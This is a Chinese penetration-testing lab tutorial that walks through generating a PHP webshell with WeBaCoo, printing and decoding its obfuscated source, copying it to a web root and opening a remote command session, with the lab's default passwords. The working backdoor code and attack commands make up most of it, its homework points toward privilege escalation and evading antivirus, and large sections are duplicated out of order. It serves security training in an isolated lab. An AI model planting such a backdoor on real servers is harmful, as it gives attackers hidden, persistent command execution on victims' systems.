

## 一、实验简介

### 1.1 实验介绍

在前面的实验二和实验八分别介绍了创建木马程序，感染目标主机这一过程，本实验也是介绍木马生成的实验。实验中将会介绍如何使用 WeBaCoo 来创建 PHP 木马后门。实验内容的第一部分会先解释 WeBaCoo 是什么，能干什么，以及它的参数含义。

随后介绍 WeBaCoo 创建 PHP 木马文件的特点，以及对其生成的 PHP 源码进行分析。接着将 PHP 木马上传至目标主机，感染目标主机。对于实验的目标靶机，可以根据自己的喜好选择宿主机 Ubuntu 或者虚拟机 Metasploitable2。

**注意：实验用的云主机因为配置成本较高，会限制次数，每个实验不超过6次**

### 1.2 主要知识点

本实验文档中主要介绍 WeBaCoo 的相关知识点，其中主要包括 WeBaCoo 的定义、用途、使用方法等。由于实验的全部操作，是在 Linux 下进行的，所以要求具备一定的 Linux 系统操作基础。在 PHP 木马文件生成后，将会对 PHP 木马文件进行上传，上传这一步需要有相应的权限。本实验的主要知识点概括如下：

- Linux 系统基本操作知识
- PHP 的基本语法知识
- WebaCoo 的命令参数含义
- WebaCoo 创建 PHP 木马文件的基本流程
- 对目标主机的攻击以及成功后验证


### 1.3 实验环境

由于该实验的特殊性，为了避免滥用安全软件攻击实验楼或其他站点，环境中禁用了联网功能，并且无法保存实验环境。本门实验的实践过程，只能在已经授权的机子上进行。渗透测试与黑客攻击不同，渗透测试指的是在具备一定授权的情况下，对目标服务器或网络进行安全防护能力评估的过程。

本门实验的实验环境由实验楼提供，宿主机为 Ubunut 14.04，宿主机上安装有两台虚拟机。其中一台为信息安全人士的镇家之宝 Kali Linux，另一台为实验常用靶机 Metasploitable2。由于 WeBaCoo 创建的木马程序为 PHP 文件，所以理论上，只要能提供 PHP 运行环境的目标主机，都能被感染。

而其中，宿主机 Ubuntu 14.04 也能提供 PHP 运行环境，所以以下的环境，可以把宿主机 Ubuntu 当成目标靶机，也可以将 Metasploitable2 当成目标靶机。实验的演示以宿主机 Ubuntu 为靶机，有兴趣的同学，也可以尝试将 Metasploitable2 作为目标靶机。

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/ff207c4ac994ae597a753f238bd6b2de/1481608459196.png-wm)


## 二、启动环境

## 2.1 启动实验环境

在本次的使用 WeBaCoo 创建 PHP 后门木马程序中，实验的主要操作都在 Kali Linux 和 宿主机 Ubuntu 上进行。在实验楼的 Ubuntu 环境中，找到命令行终端图标，双击打开终端后，输入命令如下：

```
# 在实验楼的终端中，打开 Kali 虚拟机
sudo virsh start Kali

# 使用密码，登录 Kali 虚拟机
ssh root@Kali 
```
**注意：在这步 `ssh root@Kali` 中，可能会出现报错，这是因为打开 Kali 后，需要等待大概`一分钟左右`，服务才会真正开启**其中 Kali 虚拟机的默认密码为 `toor`，如果一切顺利，你将会看到如下页面：

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481188145695.png-wm)

## 三、原理介绍

### 3.1 原理介绍

#### 1. WeBaCoo 是什么？

WeBaCoo 的全称为 Web Backdoor Cookie，它是一个小巧的，能够隐藏 PHP 的后门，提供一个连接远程连接 Web 服务器的后门程序脚本工具包。WeBaCoo 创建 PHP 木马程序，使用 HTTP 响应头传送命令结果，Shell 命令会由 Base64 编码后，隐藏在 Cookie 头中。其中命令如何经过 Base64 编码的进行隐藏这一技巧，会在后面的木马源码中进行讲解。

#### 2. WeBaCoo 用来干什么？

WeBaCoo (Web Backdoor Cookie) 作为 web 后门程序脚本的工具包，目的在于提供一个隐形终端一样的连接。首先 WebaCoo 会通过命令行终端，输入必要参数后，会创建一个 PHP 木马程序。攻击者通常将这个 PHP 木马程序上传至目标网站，或者是诱导目标主机用户者下载至服务器网站目录，进而建立起攻击机和目标靶机之间的连接，达到渗透后持续控制受害者主机的目的。

一般在成功创建木马程序，并且将木马上传至目标主机，建立起攻击者与被渗透的目标主机的连接。攻击者的下一步通常是进行提权操作。提权操作的成功与否，与目标主机本身的漏洞有一定的关系。这一切的后续操作，都是建立在攻陷目标主机的情况下。如果对如何攻陷目标主机感兴趣的同学，可以学习另一门训练营课程：

> https://www.shiyanlou.com/courses/698

#### 3. WeBaCoo 命令参数含义?

首先先查看 WeBaCoo 的参数含义，在命令行终端中，输入命令 `webacoo -h` 可以查看工具帮助选项：

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481013582306.png-wm)

后门程序脚本工具包 WebaCoo 常用的命令参数含义如下列表：

| 参数名称 | 参数所代表的含义                                       |
| -------- | ------------------------------------------------------ |
| `-g`     | 使用该参数来生成后门文件代码（Generate backdoor code） |
| `-o`     | 该参数生成后门文件的地址及文件名（包含地址的文件名）   |
| `-r`     | 生成混淆后的后门代码                                   |
| `-t`     | 连接后门文件程序                                       |
| `-u`     | 连接后门地址，执行 CMD 命令                            |

## 四、WeBaCoo 创建后门木马流程

### 4.1 创建 PHP 木马程序

在弄清楚了 PHP 后门生成工具 WeBaCoo 常用参数含义之后，我们使用如下命令，创建后门木马程序。在命令行终端中输入命令，生成 PHP 木马文件：

```
# 其中 -o 代表输入文件，如不带地址，默认为当前执行程序的目录下
webacoo  -g -o hello.php
```

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481013914062.png-wm)

使用 `ls` 命令查看当前目录下的文件，确认是否已经生成了木马文件：

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481013974754.png-wm)

### 4.2  PHP 木马源码原理解析

作为一名信息安全人士，满足于工具的使用是远远不够的。对于对木马的形成原理，以及木马中的代码如何运行，需要有一定的了解。其中使用 WeBaCoo 工具的 `-r` 参数，生成的木马文件源码更加复杂。这里为了方便解释其最核心的代码原理，文档中没有使用 `-r` 参数，这样生成了木马文件更加方便理解。接下来使用 `cat` 命令，对生成的 PHP 木马代码源码进行查看：

```
# 输入 cat 命令，查看生成的木马代码源码
cat hello.php
```
生成的木马文件，其代码如下所示，其中的核心部分为：

```
<?php 

$b=strrev("edoced_4"."6esab");

eval($b(str_replace(" ","","a W Y o a X N z Z X Q o J F 9 D T 0 9 L S U V b J 2 N t J 1 0 p K X t v Y l 9 z d G F y d C g p O 3 N 5 c 3 R l b S h i Y X N l N j R f Z G V j b 2 R l K C R f Q 0 9 P S 0 l F W y d j b S d d K S 4 n I D I + J j E n K T t z Z X R j b 2 9 r a W U o J F 9 D T 0 9 L S U V b J 2 N u J 1 0 s J F 9 D T 0 9 L S U V b J 2 N w J 1 0 u Y m F z Z T Y 0 X 2 V u Y 2 9 k Z S h v Y l 9 n Z X R f Y 2 9 u d G V u d H M o K S k u J F 9 D T 0 9 L S U V b J 2 N w J 1 0 p O 2 9 i X 2 V u Z F 9 j b G V h b i g p O 3 0 = ")));

?>
```
> Base64 编码是一种 “防君子不防小人” 的编码方式。广泛应用于 MIME 协议，作为电子邮件的传输编码，生成的编码可逆，后一两位可能有“=”，生成的编码都是 ascii 字符。

其中第一行代码的 `strrev()` 函数的作用是将字符串反转，并将反转后的字符串变量赋值给 `$b`，即：

```
# 经过函数 strrev() 处理后得到的代码
$b = "base64_decode";
```
对于下面的经过 `base64` 加密过的字符串，并且每个字符之间混夹着一个空格，我们可以使用 `Python` 对字符串进行还原，显现出其真正的代码面目，加深对木马源码的理解（**注意：下面将代码反解的过程，不用在实验楼环境中操作，这里只是为了让同学们能够清晰地看到，由 WeBaCoo 创建的 PHP 木马的原本真实源码**）：


![图片描述](https://dn-simplecloud.shiyanlou.com/uid/ff207c4ac994ae597a753f238bd6b2de/1481618443849.png-wm)

首先先进行去掉空白空格的操作，得到经过 Base64 加密杂乱无序的字符串：

```
# 替换掉其中的空格
s = s.replace(' ', '')

# 得到经过 Base64 加密过的代码字符串
aWYoaXNzZXQoJF9DT09LSUVbJ2NtJ10pKXtvYl9zdGFydCgpO3N5c3RlbShiYXNlNjRfZGVjb2RlKCRfQ09PS0lFWydjbSddKS4nIDI+JjEnKTtzZXRjb29raWUoJF9DT09LSUVbJ2NuJ10sJF9DT09LSUVbJ2NwJ10uYmFzZTY0X2VuY29kZShvYl9nZXRfY29udGVudHMoKSkuJF9DT09LSUVbJ2NwJ10pO29iX2VuZF9jbGVhbigpO30=

```

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/ff207c4ac994ae597a753f238bd6b2de/1481618755418.png-wm)

引用 `Base64` 模块进行解密，得到攻击者的最初意图代码。由解密出来的代码，可以明显的看出，代码第一步先判断 Cookie 是否设置。这里我们再回顾下 WeBaCoo 是什么原理介绍部分。其中有如下这一句话，文档中指出了 Shell 命令编码后，隐藏在 Cookie 头中：

> WeBaCoo 创建 PHP 木马程序，使用 HTTP 响应头传送命令结果，Shell 命令会由 Base64 编码后，隐藏在 Cookie 头中。

而代码中 `2>&1` 的意思是：

> 对于 & 1 更准确的说应该是文件描述符 1，而 1 一般代表的就是 STDOUT_FILENO，实际上这个操作就是一个 dup2（2） 调用。他标准输出到 all_result，然后复制标准输出到文件描述符 2（STDERR_FILENO），其后果就是文件描述符1和2指向同一个文件表项，也可以说错误的输出被合并了。

```
# 函数 isset() 用于检测变量是否设置，这里的作用是 Cookie 是否设置
if(isset($_COOKIE['cm'])){

    # 启动
    ob_start();
    
    # 使用 base64_decode 对 shell 命令进行解码
    system(base64_decode($_COOKIE['cm']).' 2>&1');
    
    # 设置 cookie 参数，并使用 base64_encode 进行编码
    setcookie($_COOKIE['cn'],$_COOKIE['cp'].base64_encode(ob_get_contents()).$_COOKIE['cp']);
    
    # 关闭
    ob_end_clean();
}
```


### 4.3 上传到目标靶机

通过上面的木马源码分析，我们了解到 WeBaCoo 创建 PHP 木马文件之后，对木马文件使用 Base64 加密，并使用 HTTP 响应头传送命令结果，Shell 命令会由 Base64 编码，隐藏在 Cookie 头中。一般情况下，在生成木马文件后，会将木马程序上传到目标主机，进而感染目标主机，建立会话通道。输入如下命令，将木马上传：

```
# 将木马文件，复制上传到目标主机
scp hello.php shiyanlou@192.168.122.1:/tmp
```
**注意： 连接实验楼宿主主机的账号为 `shiyanlou`，对应的密码是 `shiyanlou`:**

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480993526850.png-wm)

实验楼 Ubuntu 环境下，默认开启的是 `nginx` 服务。在上传木马文件后，输入命令关掉 `nginx` 服务，开启 `apache2` 服务，用以测试 PHP 木马：

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480993507282.png-wm)

```
# 关掉 nginx 服务程序
sudo service nginx stop

# 开启 apache2 服务程序
sudo service apache2 start
```
![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480993732499.png-wm)

将木马文件，复制到网站的根目录下，这里注意，要加 `sudo` 权限：

```
# 将木马文件，复制到目标主机的网站目录下
sudo cp /tmp/hello.php /var/www/html/
```
### 4.4 感染目标主机并创建会话

在将木马程序上传至目标主机后，在 Kali Linux 的终端中，输入如下命令创建会话通道：

```
# 连接目标主机，建立会话
webacoo -t -u http://192.168.122.1/hello.php
```

成功之后，命令行前缀发生了变化，如下图所示：

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481014707333.png-wm)

**注意：成功后终端前缀 `root@Kali:` 变成了 `webacoo$`**

### 4.5 查看系统信息

在命令行的前缀变成了 `webacoo$` 之后，可以使用 Linux 的基础命令，查看当前信息以及用户信息：

```
# 查看当前用户 id
id

# 查看当前用户
whoami

# 查看当前目录下有哪些文件
ls

# 查看系统信息
ifconfig
```

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481014938827.png-wm)


## 五、总结和思考

## 一、实验简介

### 1.1 实验介绍

在前面的实验二和实验八分别介绍了创建木马程序，感染目标主机这一过程，本实验也是介绍木马生成的实验。实验中将会介绍如何使用 WeBaCoo 来创建 PHP 木马后门。实验内容的第一部分会先解释 WeBaCoo 是什么，能干什么，以及它的参数含义。

随后介绍 WeBaCoo 创建 PHP 木马文件的特点，以及对其生成的 PHP 源码进行分析。接着将 PHP 木马上传至目标主机，感染目标主机。对于实验的目标靶机，可以根据自己的喜好选择宿主机 Ubuntu 或者虚拟机 Metasploitable2。

**注意：实验用的云主机因为配置成本较高，会限制次数，每个实验不超过6次**

### 1.2 主要知识点

本实验文档中主要介绍 WeBaCoo 的相关知识点，其中主要包括 WeBaCoo 的定义、用途、使用方法等。由于实验的全部操作，是在 Linux 下进行的，所以要求具备一定的 Linux 系统操作基础。在 PHP 木马文件生成后，将会对 PHP 木马文件进行上传，上传这一步需要有相应的权限。本实验的主要知识点概括如下：

- Linux 系统基本操作知识
- PHP 的基本语法知识
- WebaCoo 的命令参数含义
- WebaCoo 创建 PHP 木马文件的基本流程
- 对目标主机的攻击以及成功后验证


### 1.3 实验环境

由于该实验的特殊性，为了避免滥用安全软件攻击实验楼或其他站点，环境中禁用了联网功能，并且无法保存实验环境。本门实验的实践过程，只能在已经授权的机子上进行。渗透测试与黑客攻击不同，渗透测试指的是在具备一定授权的情况下，对目标服务器或网络进行安全防护能力评估的过程。

本门实验的实验环境由实验楼提供，宿主机为 Ubunut 14.04，宿主机上安装有两台虚拟机。其中一台为信息安全人士的镇家之宝 Kali Linux，另一台为实验常用靶机 Metasploitable2。由于 WeBaCoo 创建的木马程序为 PHP 文件，所以理论上，只要能提供 PHP 运行环境的目标主机，都能被感染。

而其中，宿主机 Ubuntu 14.04 也能提供 PHP 运行环境，所以以下的环境，可以把宿主机 Ubuntu 当成目标靶机，也可以将 Metasploitable2 当成目标靶机。实验的演示以宿主机 Ubuntu 为靶机，有兴趣的同学，也可以尝试将 Metasploitable2 作为目标靶机。

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/ff207c4ac994ae597a753f238bd6b2de/1481608459196.png-wm)


## 二、启动环境

## 2.1 启动实验环境

在本次的使用 WeBaCoo 创建 PHP 后门木马程序中，实验的主要操作都在 Kali Linux 和 宿主机 Ubuntu 上进行。在实验楼的 Ubuntu 环境中，找到命令行终端图标，双击打开终端后，输入命令如下：

```
# 在实验楼的终端中，打开 Kali 虚拟机
sudo virsh start Kali

# 使用密码，登录 Kali 虚拟机
ssh root@Kali 
```
**注意：在这步 `ssh root@Kali` 中，可能会出现报错，这是因为打开 Kali 后，需要等待大概`一分钟左右`，服务才会真正开启**其中 Kali 虚拟机的默认密码为 `toor`，如果一切顺利，你将会看到如下页面：

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481188145695.png-wm)

## 三、原理介绍

### 3.1 原理介绍

#### 1. WeBaCoo 是什么？

WeBaCoo 的全称为 Web Backdoor Cookie，它是一个小巧的，能够隐藏 PHP 的后门，提供一个连接远程连接 Web 服务器的后门程序脚本工具包。WeBaCoo 创建 PHP 木马程序，使用 HTTP 响应头传送命令结果，Shell 命令会由 Base64 编码后，隐藏在 Cookie 头中。其中命令如何经过 Base64 编码的进行隐藏这一技巧，会在后面的木马源码中进行讲解。

#### 2. WeBaCoo 用来干什么？

WeBaCoo (Web Backdoor Cookie) 作为 web 后门程序脚本的工具包，目的在于提供一个隐形终端一样的连接。首先 WebaCoo 会通过命令行终端，输入必要参数后，会创建一个 PHP 木马程序。攻击者通常将这个 PHP 木马程序上传至目标网站，或者是诱导目标主机用户者下载至服务器网站目录，进而建立起攻击机和目标靶机之间的连接，达到渗透后持续控制受害者主机的目的。

一般在成功创建木马程序，并且将木马上传至目标主机，建立起攻击者与被渗透的目标主机的连接。攻击者的下一步通常是进行提权操作。提权操作的成功与否，与目标主机本身的漏洞有一定的关系。这一切的后续操作，都是建立在攻陷目标主机的情况下。如果对如何攻陷目标主机感兴趣的同学，可以学习另一门训练营课程：

> https://www.shiyanlou.com/courses/698

#### 3. WeBaCoo 命令参数含义?

首先先查看 WeBaCoo 的参数含义，在命令行终端中，输入命令 `webacoo -h` 可以查看工具帮助选项：

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481013582306.png-wm)

后门程序脚本工具包 WebaCoo 常用的命令参数含义如下列表：

| 参数名称 | 参数所代表的含义                                       |
| -------- | ------------------------------------------------------ |
| `-g`     | 使用该参数来生成后门文件代码（Generate backdoor code） |
| `-o`     | 该参数生成后门文件的地址及文件名（包含地址的文件名）   |
| `-r`     | 生成混淆后的后门代码                                   |
| `-t`     | 连接后门文件程序                                       |
| `-u`     | 连接后门地址，执行 CMD 命令                            |

## 四、WeBaCoo 创建后门木马流程

### 4.1 创建 PHP 木马程序

在弄清楚了 PHP 后门生成工具 WeBaCoo 常用参数含义之后，我们使用如下命令，创建后门木马程序。在命令行终端中输入命令，生成 PHP 木马文件：

```
# 其中 -o 代表输入文件，如不带地址，默认为当前执行程序的目录下
webacoo  -g -o hello.php
```

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481013914062.png-wm)

使用 `ls` 命令查看当前目录下的文件，确认是否已经生成了木马文件：

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481013974754.png-wm)

### 4.2  PHP 木马源码原理解析

作为一名信息安全人士，满足于工具的使用是远远不够的。对于对木马的形成原理，以及木马中的代码如何运行，需要有一定的了解。其中使用 WeBaCoo 工具的 `-r` 参数，生成的木马文件源码更加复杂。这里为了方便解释其最核心的代码原理，文档中没有使用 `-r` 参数，这样生成了木马文件更加方便理解。接下来使用 `cat` 命令，对生成的 PHP 木马代码源码进行查看：

```
# 输入 cat 命令，查看生成的木马代码源码
cat hello.php
```
生成的木马文件，其代码如下所示，其中的核心部分为：

```
<?php 

$b=strrev("edoced_4"."6esab");

eval($b(str_replace(" ","","a W Y o a X N z Z X Q o J F 9 D T 0 9 L S U V b J 2 N t J 1 0 p K X t v Y l 9 z d G F y d C g p O 3 N 5 c 3 R l b S h i Y X N l N j R f Z G V j b 2 R l K C R f Q 0 9 P S 0 l F W y d j b S d d K S 4 n I D I + J j E n K T t z Z X R j b 2 9 r a W U o J F 9 D T 0 9 L S U V b J 2 N u J 1 0 s J F 9 D T 0 9 L S U V b J 2 N w J 1 0 u Y m F z Z T Y 0 X 2 V u Y 2 9 k Z S h v Y l 9 n Z X R f Y 2 9 u d G V u d H M o K S k u J F 9 D T 0 9 L S U V b J 2 N w J 1 0 p O 2 9 i X 2 V u Z F 9 j b G V h b i g p O 3 0 = ")));

?>
```
> Base64 编码是一种 “防君子不防小人” 的编码方式。广泛应用于 MIME 协议，作为电子邮件的传输编码，生成的编码可逆，后一两位可能有“=”，生成的编码都是 ascii 字符。

其中第一行代码的 `strrev()` 函数的作用是将字符串反转，并将反转后的字符串变量赋值给 `$b`，即：

```
# 经过函数 strrev() 处理后得到的代码
$b = "base64_decode";
```
对于下面的经过 `base64` 加密过的字符串，并且每个字符之间混夹着一个空格，我们可以使用 `Python` 对字符串进行还原，显现出其真正的代码面目，加深对木马源码的理解（**注意：下面将代码反解的过程，不用在实验楼环境中操作，这里只是为了让同学们能够清晰地看到，由 WeBaCoo 创建的 PHP 木马的原本真实源码**）：


![图片描述](https://dn-simplecloud.shiyanlou.com/uid/ff207c4ac994ae597a753f238bd6b2de/1481618443849.png-wm)

首先先进行去掉空白空格的操作，得到经过 Base64 加密杂乱无序的字符串：

```
# 替换掉其中的空格
s = s.replace(' ', '')

# 得到经过 Base64 加密过的代码字符串
aWYoaXNzZXQoJF9DT09LSUVbJ2NtJ10pKXtvYl9zdGFydCgpO3N5c3RlbShiYXNlNjRfZGVjb2RlKCRfQ09PS0lFWydjbSddKS4nIDI+JjEnKTtzZXRjb29raWUoJF9DT09LSUVbJ2NuJ10sJF9DT09LSUVbJ2NwJ10uYmFzZTY0X2VuY29kZShvYl9nZXRfY29udGVudHMoKSkuJF9DT09LSUVbJ2NwJ10pO29iX2VuZF9jbGVhbigpO30=

```

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/ff207c4ac994ae597a753f238bd6b2de/1481618755418.png-wm)

引用 `Base64` 模块进行解密，得到攻击者的最初意图代码。由解密出来的代码，可以明显的看出，代码第一步先判断 Cookie 是否设置。这里我们再回顾下 WeBaCoo 是什么原理介绍部分。其中有如下这一句话，文档中指出了 Shell 命令编码后，隐藏在 Cookie 头中：

> WeBaCoo 创建 PHP 木马程序，使用 HTTP 响应头传送命令结果，Shell 命令会由 Base64 编码后，隐藏在 Cookie 头中。

而代码中 `2>&1` 的意思是：

> 对于 & 1 更准确的说应该是文件描述符 1，而 1 一般代表的就是 STDOUT_FILENO，实际上这个操作就是一个 dup2（2） 调用。他标准输出到 all_result，然后复制标准输出到文件描述符 2（STDERR_FILENO），其后果就是文件描述符1和2指向同一个文件表项，也可以说错误的输出被合并了。

```
# 函数 isset() 用于检测变量是否设置，这里的作用是 Cookie 是否设置
if(isset($_COOKIE['cm'])){

    # 启动
    ob_start();
    
    # 使用 base64_decode 对 shell 命令进行解码
    system(base64_decode($_COOKIE['cm']).' 2>&1');
    
    # 设置 cookie 参数，并使用 base64_encode 进行编码
    setcookie($_COOKIE['cn'],$_COOKIE['cp'].base64_encode(ob_get_contents()).$_COOKIE['cp']);
    
    # 关闭
    ob_end_clean();
}
```


### 4.3 上传到目标靶机

通过上面的木马源码分析，我们了解到 WeBaCoo 创建 PHP 木马文件之后，对木马文件使用 Base64 加密，并使用 HTTP 响应头传送命令结果，Shell 命令会由 Base64 编码，隐藏在 Cookie 头中。一般情况下，在生成木马文件后，会将木马程序上传到目标主机，进而感染目标主机，建立会话通道。输入如下命令，将木马上传：

```
# 将木马文件，复制上传到目标主机
scp hello.php shiyanlou@192.168.122.1:/tmp
```
**注意： 连接实验楼宿主主机的账号为 `shiyanlou`，对应的密码是 `shiyanlou`:**

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480993526850.png-wm)

实验楼 Ubuntu 环境下，默认开启的是 `nginx` 服务。在上传木马文件后，输入命令关掉 `nginx` 服务，开启 `apache2` 服务，用以测试 PHP 木马：

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480993507282.png-wm)

```
# 关掉 nginx 服务程序
sudo service nginx stop

# 开启 apache2 服务程序
sudo service apache2 start
```
![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480993732499.png-wm)

将木马文件，复制到网站的根目录下，这里注意，要加 `sudo` 权限：

```
# 将木马文件，复制到目标主机的网站目录下
sudo cp /tmp/hello.php /var/www/html/
```
### 4.4 感染目标主机并创建会话

在将木马程序上传至目标主机后，在 Kali Linux 的终端中，输入如下命令创建会话通道：

```
# 连接目标主机，建立会话
webacoo -t -u http://192.168.122.1/hello.php
```

成功之后，命令行前缀发生了变化，如下图所示：

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481014707333.png-wm)

**注意：成功后终端前缀 `root@Kali:` 变成了 `webacoo$`**

### 4.5 查看系统信息

在命令行的前缀变成了 `webacoo$` 之后，可以使用 Linux 的基础命令，查看当前信息以及用户信息：

```
# 查看当前用户 id
id

# 查看当前用户
whoami

# 查看当前目录下有哪些文件
ls

# 查看系统信息
ifconfig
```

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481014938827.png-wm)


## 五、总结和思考

### 5.1 总结和思考

本实验介绍的是 web 后门程序脚本的工具包 WeBaCoo（全称为 Web Backdoor Cookie）的具体使用。其中介绍了 WeBaCoo 如何创建一个 PHP 木马程序，并对生成的木马程序 `hello.php` 进行了源码分析。从分析的过程中，我们知道 WeBaCoo 创建 PHP 木马程序，使用 HTTP 响应头传送命令结果，Shell 命令会由 Base64 编码后，隐藏在 Cookie 头中。

创建 PHP 木马程序的思路为，先通过 strrev() 函数，对 Base64_decode 字符进行反转，接着对于 Base64 编码生成的字符串，使用空格混夹在代码里，欺骗免杀程序，提高木马的存活率。

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/ff207c4ac994ae597a753f238bd6b2de/1481623151367.png-wm)

## 六、课后作业

### 6.1 课后作业

工具包 WeBaCoo 对于在 Kali 的 MSF 终端中，也有相应的模块，该模块是使用 Ruby 语言进行编写的。对底层实现感兴趣，并且有 Ruby 基础的同学，可以阅读 WeBaCoo 工具在 MSF 中的 `msf_webacoo_module.rb` 源码：

> https://github.com/anestisb/WeBaCoo/blob/master/msf_webacoo_module.rb

在学习了这门实验后，我们知道了 PHP 木马代码，是通过 Base64 加密，并插入大量空格混淆代码，从而避免查杀程序。现在请同学们思考如下问题：

- 除了 Base64 加密，能够使用其他加密算法？
- 是否一定是 PHP 程序木马，在原理不变的情况下，是否可以是其他语言的木马？
- 在创建会话连接后，如何对服务器进行提权操作？

本训练营到这里结束了，感谢大家学习本训练营的课程，只有多练习，多动手，才能在实践中学会知识，对于课程中不懂的问题，欢迎大家在讨论区进行提问，老师和实验楼的助教会尽力为大家答疑。

### 5.1 总结和思考

本实验介绍的是 web 后门程序脚本的工具包 WeBaCoo（全称为 Web Backdoor Cookie）的具体使用。其中介绍了 WeBaCoo 如何创建一个 PHP 木马程序，并对生成的木马程序 `hello.php` 进行了源码分析。从分析的过程中，我们知道 WeBaCoo 创建 PHP 木马程序，使用 HTTP 响应头传送命令结果，Shell 命令会由 Base64 编码后，隐藏在 Cookie 头中。

创建 PHP 木马程序的思路为，先通过 strrev() 函数，对 Base64_decode 字符进行反转，接着对于 Base64 编码生成的字符串，使用空格混夹在代码里，欺骗免杀程序，提高木马的存活率。

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/ff207c4ac994ae597a753f238bd6b2de/1481623151367.png-wm)

## 六、课后作业

### 6.1 课后作业

工具包 WeBaCoo 对于在 Kali 的 MSF 终端中，也有相应的模块，该模块是使用 Ruby 语言进行编写的。对底层实现感兴趣，并且有 Ruby 基础的同学，可以阅读 WeBaCoo 工具在 MSF 中的 `msf_webacoo_module.rb` 源码：

> https://github.com/anestisb/WeBaCoo/blob/master/msf_webacoo_module.rb

在学习了这门实验后，我们知道了 PHP 木马代码，是通过 Base64 加密，并插入大量空格混淆代码，从而避免查杀程序。现在请同学们思考如下问题：

- 除了 Base64 加密，能够使用其他加密算法？
- 是否一定是 PHP 程序木马，在原理不变的情况下，是否可以是其他语言的木马？
- 在创建会话连接后，如何对服务器进行提权操作？

本训练营到这里结束了，感谢大家学习本训练营的课程，只有多练习，多动手，才能在实践中学会知识，对于课程中不懂的问题，欢迎大家在讨论区进行提问，老师和实验楼的助教会尽力为大家答疑。